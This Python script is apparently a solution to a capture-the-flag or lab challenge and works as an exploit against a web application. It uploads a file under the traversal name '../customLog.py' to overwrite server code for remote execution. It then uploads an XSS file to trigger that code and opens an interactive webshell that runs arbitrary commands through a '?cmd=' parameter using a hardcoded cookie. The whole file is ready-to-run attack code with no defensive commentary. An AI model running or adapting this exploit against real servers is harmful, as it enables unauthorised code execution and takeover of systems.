import requests
import argparse
import cmd
import time
args = argparse.ArgumentParser()
args.add_argument('--ip', '-i', default='127.0.0.1', type=str)
args.add_argument('--port', '-p', default=5000, type=int)
args = args.parse_args()

class webshell(cmd.Cmd):
    
    def __init__(self) -> None:
        super().__init__()
        self.cookies = {"pass":"pass0wrd!"}
        response = requests.get(f'http://{args.ip}:{args.port}/webshell', cookies=self.cookies)
        webshell.prompt = "{0} --> ".format(response.text.strip())
    def default(self, cmd) -> None:
        if cmd == "exit":
            quit("GoodBye!")
        elif not cmd == '':
            response = requests.get(f'http://{args.ip}:{args.port}/webshell?cmd={cmd}', cookies=self.cookies)
            print(response.text)


def exploit():
    files={'file': ('../customLog.py', open('shell.py','rb'))} # upload rce
    response = requests.post(f'http://{args.ip}:{args.port}/', files=files) # upload file
    time.sleep(2)
    files={'file': ('xss.txt', open('xss.txt','rb'))} # upload xss
    response = requests.post(f'http://{args.ip}:{args.port}/', files=files) # call log for execute code
    if "succeeded!" in response.text:
        print(f"xss: http://{args.ip}:{args.port}/share?filename=xss.txt")
        time.sleep(2)
        webshell().cmdloop()

if __name__ == "__main__":
    exploit()

